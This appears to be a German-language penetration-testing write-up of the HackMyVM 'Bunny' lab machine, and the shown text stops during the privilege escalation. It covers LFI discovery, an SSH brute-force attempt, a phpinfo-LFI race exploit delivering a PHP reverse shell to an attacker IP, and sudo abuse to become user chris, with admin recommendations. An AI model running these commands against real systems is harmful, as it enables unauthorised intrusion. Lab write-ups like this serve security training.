@@ -1,0 +1,676 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bunny - HackMyVM - Hard - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Bunny - HackMyVM - Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">python2</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">head</div>
+                <div class="tool-item">mktemp</div>
+                <div class="tool-item">zip</div>
+                <div class="tool-item">grep</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & LFI</a></li>
+                <li><a href="#initial-access-attempts">Initial Access Versuche</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept & Initial Access (LFI + PHPInfo Exploit)</a></li>
+                <li><a href="#privilege-escalation-chris">Privilege Escalation (www-data zu chris)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (chris zu root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+                <li><a href="#zusammenfassung-empfehlungen">Zusammenfassung & Empfehlungen</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.154	08:00:27:4d:b0:a0	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich. Ein Host mit der IP-Adresse `192.168.2.154` und einer MAC-Adresse, die auf eine VirtualBox-VM hindeutet (`PCS Systemtechnik GmbH`), wurde gefunden. Dies ist unser primäres Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP `192.168.2.154` für weitere Scans (Nmap) verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring kann helfen, solche Scans zu erkennen. Eine klare Inventarisierung von VMs im Netzwerk ist wichtig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.154 -p-</span></div>
+                    <pre>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 98:7a:07:5b:ed:f7:76:e3:f5:2e:10:16:ba:61:dd:77 (RSA)
+|   256 bc:f8:11:12:e7:cb:20:c5:6c:87:00:b5:57:43:22:d3 (ECDSA)
+|_  256 9a:61:00:d8:47:fb:7c:b1:a3:4d:4c:f6:8d:5e:40:59 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:4D:B0:A0 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms bunny.vm (192.168.2.154)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird durchgeführt (`-sS` SYN-Scan, `-sC` Standard-Skripte, `-T5` schnelles Timing, `-sV` Versionserkennung, `-A` Aggressive Optionen inkl. OS-Detektion, `-p-` alle Ports).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei offene Ports wurden identifiziert: Port 22 (SSH, OpenSSH 7.9p1 auf Debian 10) und Port 80 (HTTP, Apache 2.4.38 auf Debian). Die SSH-Version ist relativ aktuell, aber nicht die Neueste. Der Apache-Webserver auf Port 80 ist der wahrscheinlichste Einstiegspunkt. Die OS-Erkennung deutet auf einen Linux-Kernel zwischen 4.15 und 5.6 hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Webserver auf Port 80 genauer untersuchen (Verzeichnis-Bruteforce, Schwachstellenscans). SSH als sekundäres Ziel betrachten (Brute-Force, falls Benutzernamen gefunden werden).<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass sowohl SSH als auch Apache aktuell und sicher konfiguriert sind. Nicht benötigte Ports schließen.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & LFI</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.154 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,.bck,mp4,mkv -t 100 -s "200,204,301,302,307,401" | grep -v "Size: 0"</span></div> <!-- Ausgabe von grep nachgeschaltet -->
+                    <pre>
+http://192.168.2.154/index.php            (Status: 200) [Size: 25]
+http://192.168.2.154/upload.php           (Status: 200) [Size: 27305]
+http://192.168.2.154/password.txt         (Status: 200) [Size: 537]
+http://192.168.2.154/config.php           (Status: 200) [Size: 24691]
+http://192.168.2.154/bunny.jpg            (Status: 200) [Size: 23668]
+http://192.168.2.154/phpinfo.php          (Status: 200) [Size: 95613]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird für ein Verzeichnis- und Datei-Bruteforce auf dem Webserver (Port 80) verwendet. Eine umfangreiche Liste von Dateiendungen (`-x ...`) und eine hohe Thread-Anzahl (`-t 100`) werden genutzt. Die Ausgabe wird gefiltert (`grep -v "Size: 0"`), um leere Antworten auszublenden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sehr erfolgreich! Mehrere interessante Dateien werden gefunden:
+                <ul>
+                    <li>`index.php`: Die Hauptseite.</li>
+                    <li>`upload.php`: Eine Upload-Funktion, potenziell ein Angriffsvektor.</li>
+                    <li>`password.txt`: Hochgradig verdächtig!</li>
+                    <li>`config.php`: Könnte Datenbank-Credentials oder andere sensible Konfigurationen enthalten.</li>
+                    <li>`bunny.jpg`: Ein Bild, wahrscheinlich harmlos, aber Teil der Seite.</li>
+                    <li>`phpinfo.php`: Enthüllt detaillierte PHP-Konfigurationsinformationen, was für die Exploit-Entwicklung (z.B. LFI mit temporären Dateien) nützlich sein kann.</li>
+                </ul>
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle gefundenen Dateien abrufen und analysieren, insbesondere `password.txt`, `config.php`, `upload.php` und `phpinfo.php`.<br><strong>Empfehlung (Admin):</strong> Zugriff auf sensible Dateien wie `password.txt`, `config.php` und `phpinfo.php` beschränken oder diese entfernen. Upload-Funktionen sicher implementieren (Dateityp-Validierung, Größenbeschränkung, Speicherung außerhalb des Web-Roots).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.154/password.txt</span></div>
+                    <pre>
+                /|         ,
+              ,///        /|
+             // //     ,///
+            // //     // //
+           // //     || ||
+           || ||    // //
+           || ||   // //
+           || ||  // //
+           || || || ||
+           \\,\|,|\_//
+            \\)\)\\|/
+            )-."" .-(
+           //^\` `/^\\
+          //  |   |  \\
+        ,/_| 0| _ | 0|_\,
+      /`    `"=.v.="`    `\
+     /`    _."{_,_}"._    `\
+     `/`  ` \  |||  / `  `\`
+      `",_  \\=^~^=//  _,"`
+          "=,\'-=-'/,="
+              '---'
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der gefundenen Datei `password.txt` wird mit `curl` abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Enttäuschung und Ablenkungsmanöver. Die Datei enthält kein Passwort, sondern ASCII-Kunst eines Hasen. Der Dateiname ist irreführend.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sich nicht von Dateinamen täuschen lassen. Den Fokus auf die anderen gefundenen Dateien (`index.php`, `upload.php`, `config.php`, `phpinfo.php`) legen.<br><strong>Empfehlung (Admin):</strong> Keine irreführenden Dateinamen verwenden. Unnötige Dateien entfernen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.2.154/index.php?FUZZ=/etc/passwd -Z -t 100 --hh 25</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warn(
+
+ Wfuzz 3.1.0 - The Web Fuzzer
+
+Target: http://192.168.2.154/index.php?FUZZ=/etc/passwd
+Total requests: 6453
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000003976:   200        31 L     43 W       1508 Ch     "page"
+
+=====================================================================
+Total time: ...
+Processed Requests: 6453
+Filtered Requests: 6452
+Requests/sec.: ...
+                    </pre> <!-- Ignore Errors (-Z), Hide Chars (--hh 25) -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach GET-Parametern für `index.php` zu fuzzeln. Es wird eine Wortliste mit gängigen Parameternamen (`burp-parameter-names.txt`) verwendet. Als Wert für den gefuzzten Parameter (`FUZZ`) wird testweise `/etc/passwd` eingesetzt. Fehler werden ignoriert (`-Z`). Antworten mit 25 Zeichen werden ausgeblendet (`--hh 25`, wahrscheinlich die Größe der Standardantwort von `index.php` ohne gültigen Parameter).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Der Parameter `page` wird identifiziert. Wenn `index.php?page=/etc/passwd` aufgerufen wird, ist die Antwort deutlich größer (1508 Chars) als die Standardantwort (25 Chars, die ausgeblendet wird). Dies ist ein sehr starker Hinweis auf eine Local File Inclusion (LFI)-Schwachstelle über den `page`-Parameter.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die LFI mit `page=/etc/passwd` bestätigen, indem der Inhalt abgerufen wird. Weitere sensible Dateien über LFI auslesen (`/etc/shadow`, `config.php`, SSH-Keys, Log-Dateien). Prüfen, ob die LFI für Remote Code Execution (RCE) missbraucht werden kann (z.B. via PHP-Wrapper `php://filter`, `php://input`, oder Log Poisoning).<br><strong>Empfehlung (Admin):</strong> Die LFI-Schwachstelle in `index.php` sofort beheben. Serverseitige Validierung und Sanitisierung des `page`-Parameters implementieren, um nur erlaubte Dateien einzubinden. Idealerweise keine Benutzereingaben direkt in Dateipfad-Funktionen verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.154/index.php?page=/etc/passwd | grep bash</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1508  100  1508    0     0  2085k      0 --:--:-- --:--:-- --:--:-- 1472k
+root:x:0:0:root:/root:/bin/bash
+chris:x:1000:1000:chris,,,:/home/chris:/bin/bash
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Bestätigung der LFI-Schwachstelle durch Abrufen von `index.php?page=/etc/passwd` mit `curl`. Die Ausgabe wird mit `grep bash` gefiltert, um Benutzer mit einer Bash-Shell zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> LFI bestätigt! Der Inhalt von `/etc/passwd` wird angezeigt. Es werden zwei Benutzer mit Bash-Shells identifiziert: `root` und `chris`. Der Benutzer `chris` ist ein potenzielles Ziel für weitere Angriffe (z.B. SSH Brute-Force).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Benutzernamen `chris` für SSH-Brute-Force-Versuche verwenden. Weitere Dateien über LFI auslesen.<br><strong>Empfehlung (Admin):</strong> LFI-Schwachstelle dringend beheben!</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.154/index.php?page=/home/chris/.ssh/id_rsa</span></div>
+                    <pre><img src="bunny.jpg"></pre> <!-- HTML maskiert -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.154/index.php?page=/home/chris/.ssh/id_rsa.pub</span></div>
+                    <pre><img src="bunny.jpg"></pre> <!-- HTML maskiert -->
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, über die LFI-Schwachstelle den privaten (`id_rsa`) und öffentlichen (`id_rsa.pub`) SSH-Schlüssel des Benutzers `chris` auszulesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Statt des Schlüsselmaterials wird nur das HTML-Tag für das Hasenbild (`bunny.jpg`) zurückgegeben. Dies deutet darauf hin, dass die LFI-Implementierung möglicherweise bestimmte Pfade (wie `.ssh`) oder Dateiinhalte filtert oder dass die Dateien nicht existieren oder für den `www-data`-Benutzer nicht lesbar sind.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere interessante Dateien testen. Den Fokus auf andere Angriffsvektoren wie die `phpinfo.php`-Seite oder die `upload.php`-Funktion legen.<br><strong>Empfehlung (Admin):</strong> Selbst wenn dieser Versuch scheiterte, zeigt er die Gefahr der LFI. Die Schwachstelle muss behoben werden.</p>
+        </section>
+
+        <section id="initial-access-attempts">
+            <h2>Initial Access Versuche</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://bunny.vm:22 -t64 -I</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-17 14:31:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344421 login tries (l:1/p:14344421), ~224132 tries per task
+[DATA] attacking ssh://bunny.vm:22/
+# (Keine Erfolgs- oder Fehlermeldung im weiteren Text, Annahme: abgebrochen oder erfolglos)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Erneuter SSH-Brute-Force-Versuch mit `hydra`, diesmal gezielt auf den Benutzer `chris` (der aus `/etc/passwd` bekannt ist). `-I` überspringt das Laden einer vorherigen Restore-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vermutlich fehlgeschlagen. Es gibt keine Erfolgsmeldung, und der Angreifer wendet sich anderen Methoden zu. Wahrscheinlich greift weiterhin das Rate-Limiting des SSH-Servers.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SSH-Brute-Force ist hier wahrscheinlich nicht der vorgesehene Weg. Konzentration auf die Web-Schwachstellen, insbesondere die LFI und `phpinfo.php`.<br><strong>Empfehlung (Admin):</strong> Rate-Limiting und starke Passwörter/Keys sind effektive Abwehrmaßnahmen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Recherche nach "phpinfolfi" führt zu einem Exploit-Skript (`phpinfolfi.py`) von Insomniasec. Diese Technik nutzt eine Race Condition: Man lädt eine Datei hoch und kann über `phpinfo()` den temporären Dateinamen erfahren. Wenn man diesen temporären Dateinamen schnell genug an eine LFI-Schwachstelle übergibt (bevor die Datei gelöscht wird), kann man den Inhalt der hochgeladenen Datei (z.B. eine Webshell oder Reverse Shell) ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine fortgeschrittene, aber bekannte Technik zur Ausnutzung von LFI in Kombination mit einer exponierten `phpinfo()`-Seite und Dateiupload-Möglichkeit (die `upload.php` muss nicht unbedingt funktionieren, da `phpinfo()` selbst temporäre Dateien für POST-Requests anlegt).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `phpinfolfi.py`-Skript herunterladen, anpassen und ausführen, um RCE zu erlangen.<br><strong>Empfehlung (Admin):</strong> `phpinfo()` auf Produktivsystemen deaktivieren oder stark einschränken. LFI-Schwachstellen beheben. Dateiuploads sicher gestalten.</p>
+        </section>
+
+       <section id="poc-initial-access">
+           <h2>Proof of Concept & Initial Access (LFI + PHPInfo Exploit)</h2>
+           <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC nutzt die Kombination aus der LFI-Schwachstelle im `page`-Parameter von `index.php` und der exponierten `phpinfo.php`-Seite. Ein spezialisiertes Skript (`phpinfolfi.py`) wird verwendet, um eine Race Condition auszunutzen: Es sendet gleichzeitig viele Anfragen an `phpinfo.php` (mit einem Dateiupload im POST-Body, der eine PHP-Reverse-Shell enthält) und an `index.php` (mit dem `page`-Parameter, der auf den erwarteten temporären Dateinamen zielt). Wenn das Timing stimmt, wird die Reverse-Shell-Datei via LFI inkludiert und ausgeführt, bevor PHP sie löscht.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>LFI-Schwachstelle (`index.php?page=`).</li>
+                    <li>Erreichbare `phpinfo.php`.</li>
+                    <li>Exploit-Skript (`phpinfolfi.py`, angepasst).</li>
+                    <li>PHP-Reverse-Shell-Payload (`rev.php`, angepasst).</li>
+                    <li>Netcat-Listener auf dem Angreifer-System.</li>
+                </ul>
+            </p>
+           <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+            <ol>
+                <li>
+                    <strong>Identifizieren des temporären Dateinamens (Test):</strong>
+                    <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(cyber㉿cyber)-[~]
+└─$ <span class="command">nano test.py</span></div>
+                            <pre>
+import requests
+
+file = {'file': ("test.txt", "hmv")}
+url = "http://192.168.2.154/phpinfo.php"
+req = requests.post(files=file, url=url, allow_redirects=False)
+print(req.text)
+                            </pre>
+                            <div class="prompt">┌──(cyber㉿cyber)-[~]
+└─$ <span class="command">python test.py | grep tmp_name</span></div>
+                            <pre>    [tmp_name] => /tmp/phpHZmh7j</pre>
+                        </div>
+                    </div>
+                    <p class="analysis">Analyse: Ein Testskript sendet einen POST-Request mit einer Dummy-Datei an `phpinfo.php`. Die Ausgabe von `phpinfo()` enthält den Pfad zur temporär gespeicherten Datei (`[tmp_name]`). Dies bestätigt, dass der Pfad exponiert wird.</p>
+                </li>
+                <li>
+                    <strong>Anpassen des Exploit-Skripts (`phpinfolfi.py`):</strong>
+                     <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">grep index.php /home/cyber/Downloads/phpinfolfi.py</span></div>
+                            <pre>    LFIREQ="""GET /index.php?page=%s HTTP/1.1\r</pre>
+                         </div>
+                    </div>
+                     <p class="analysis">Analyse: Sicherstellen, dass die LFI-Anfrage im Exploit-Skript korrekt formatiert ist (`/index.php?page=%s`).</p>
+                </li>
+                <li>
+                    <strong>Vorbereiten der PHP-Reverse-Shell (`rev.php`):</strong>
+                    <div class="code-block">
+                        <div class="terminal">
+                             <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">grep ip rev.php</span></div>
+                            <pre>
+# ... (gekürzt) ...
+$ip = '192.168.2.153';  // CHANGE THIS
+# ... (gekürzt) ...
+printit("Successfully opened reverse shell to $ip:$port");
+                            </pre>
+                         </div>
+                    </div>
+                    <p class="analysis">Analyse: Überprüfen und Anpassen der Angreifer-IP (`192.168.2.153`) und des Ports (Standard ist oft 9001 oder ähnlich) in der PHP-Reverse-Shell-Datei, die hochgeladen werden soll.</p>
+                </li>
+                 <li>
+                    <strong>Starten des Netcat-Listeners:</strong>
+                    <div class="code-block">
+                        <div class="terminal">
+                             <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                             <pre>listening on [any] 9001 ..</pre>
+                         </div>
+                    </div>
+                     <p class="analysis">Analyse: Ein Listener wird auf dem Angreifer-System (192.168.2.153) auf Port 9001 gestartet, um die eingehende Reverse Shell abzufangen.</p>
+                 </li>
+                <li>
+                    <strong>Ausführen des PHPInfo-LFI-Exploits:</strong>
+                    <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">python2 /home/cyber/Downloads/phpinfolfi.py 192.168.2.154 80</span></div>
+                            <pre>
+LFI With PHPInfo()
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Getting initial offset... found [tmp_name] at 137069
+Spawning worker pool (10)...
+ 1000 /  1000
+:(
+Shuttin' down...
+                            </pre>
+                         </div>
+                    </div>
+                    <p class="analysis">Analyse: Das Exploit-Skript wird mit `python2` gestartet, zielt auf die Opfer-IP (`192.168.2.154`) und den HTTP-Port (`80`). Es versucht, die Race Condition auszunutzen. Die Ausgabe `:(` deutet oft darauf hin, dass der Exploit nicht beim ersten Versuch erfolgreich war, aber die Verbindung im Hintergrund trotzdem zustande kommen kann.</p>
+                </li>
+            </ol>
+            <p class="evaluation"><strong>Erwartetes & Tatsächliches Ergebnis:</strong> Eine Reverse Shell verbindet sich zum Netcat-Listener.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.153] from (UNKNOWN) [192.168.2.154] 45034
+Linux bunny 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
+ 15:41:20 up  1:18,  0 users,  load average: 0.06, 0.11, 0.77
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Eine Reverse Shell wurde erfolgreich als Benutzer `www-data` (Apache-Benutzer) etabliert.</p>
+             <p class="evaluation"><strong>Beweismittel:</strong> Die eingehende Verbindung im Netcat-Listener und der Shell-Prompt als `www-data`.</p>
+             <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die Kombination aus LFI und `phpinfo()` ermöglichte Remote Code Execution als Webserver-Benutzer.</p>
+             <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                 <ul>
+                     <li>LFI-Schwachstelle in `index.php` beheben.</li>
+                     <li>`phpinfo.php` vom Webserver entfernen oder Zugriff stark einschränken.</li>
+                     <li>Generelle PHP-Härtung (z.B. `disable_functions` für gefährliche Funktionen wie `system`, `shell_exec`).</li>
+                     <li>Webserver-Prozess (`www-data`) mit minimal notwendigen Rechten laufen lassen.</li>
+                 </ul>
+             </p>
+
+            <h3>Shell Stabilisierung</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt target-shell">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <div class="prompt target-shell">www-data@bunny:/$ <span class="command">export TERM=xterm</span></div>
+                     <pre>www-data@bunny:/$ # (Ctrl+Z gedrückt)</pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset # (Manchmal erscheint 'reset', manchmal nicht)
+www-data@bunny:/$ # (Shell ist jetzt stabil)
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die einfache `/bin/sh`-Shell wird mit Python's `pty`-Modul zu einer interaktiveren Bash-Shell aufgewertet. `TERM=xterm` wird gesetzt und `stty raw -echo` auf der Angreiferseite verwendet, um eine voll funktionsfähige TTY-Shell zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Schritt für eine komfortablere und stabilere Interaktion mit dem Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein Standardverfahren zur Shell-Stabilisierung.<br><strong>Empfehlung (Admin):</strong> Keine direkten Abwehrmaßnahmen gegen Stabilisierung, aber das Erkennen der initialen Shell ist entscheidend.</p>
+        </section>
+
+        <section id="privilege-escalation-chris">
+            <h2>Privilege Escalation (www-data zu chris)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt target-shell">www-data@bunny:/$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on bunny:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on bunny:
+    (chris) NOPASSWD: /bin/bash /home/chris/lab/magic
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Überprüfung der `sudo`-Rechte für den aktuellen Benutzer `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `www-data` darf das Skript `/home/chris/lab/magic` mit `/bin/bash` als Benutzer `chris` ohne Passwort ausführen. Dies ist ein klarer Weg zur horizontalen Bewegung oder Eskalation zum Benutzer `chris`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Skript `/home/chris/lab/magic` analysieren oder direkt versuchen, über diesen `sudo`-Eintrag eine Shell als `chris` zu erhalten.<br><strong>Empfehlung (Admin):</strong> `sudo`-Rechte überprüfen und minimieren. Niemals `NOPASSWD` für Skripte verwenden, die Shell-Zugriff ermöglichen oder unsicher sind. Webserver-Benutzer sollten idealerweise keine `sudo`-Rechte haben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt target-shell">www-data@bunny:/$ <span class="command">ls /home/chris/</span></div>
+                    <pre>
+lab
+user.txt
+                    </pre>
+                     <div class="prompt target-shell">www-data@bunny:/$ <span class="command">sudo -u chris /bin/bash /home/chris/lab/magic /home/chris/user.txt</span></div>
+                     <pre>/home/chris/user.txt: line 1: b9c1575e8d8f934a4101fdbec2f711fe: command not found</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Auflisten des Home-Verzeichnisses von `chris`. Versuch, den Inhalt von `user.txt` als Befehl über das `magic`-Skript auszuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zeigt, dass `user.txt` existiert. Der Versuch, die Flag als Befehl auszuführen, scheitert erwartungsgemäß. Es scheint, dass das `magic`-Skript seine Argumente als Befehle interpretiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Anstatt den Inhalt der Flag auszuführen, einen Befehl übergeben, der eine Shell startet, z.B. `/bin/bash`.<br><strong>Empfehlung (Admin):</strong> Das `magic`-Skript überprüfen oder entfernen. `sudo`-Regel anpassen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">www-data@bunny:/$ <span class="command">sudo -u chris /bin/bash /home/chris/lab/magic zip $(mktemp -u) /etc/hosts</span></div>
+                     <pre># (Keine direkte Ausgabe, aber der Prompt ändert sich implizit)</pre>
+                      <div class="prompt target-shell">$ <span class="command">id</span></div> <!-- Neuer Prompt ohne Benutzer@Host -->
+                      <pre>uid=1000(chris) gid=1000(chris) groups=1000(chris),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</pre>
+                  </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ausführung des `magic`-Skripts mit `sudo -u chris`. Als Argument wird der Befehl `zip` mit temporären Argumenten übergeben. Anschließend wird `id` ausgeführt.</p>
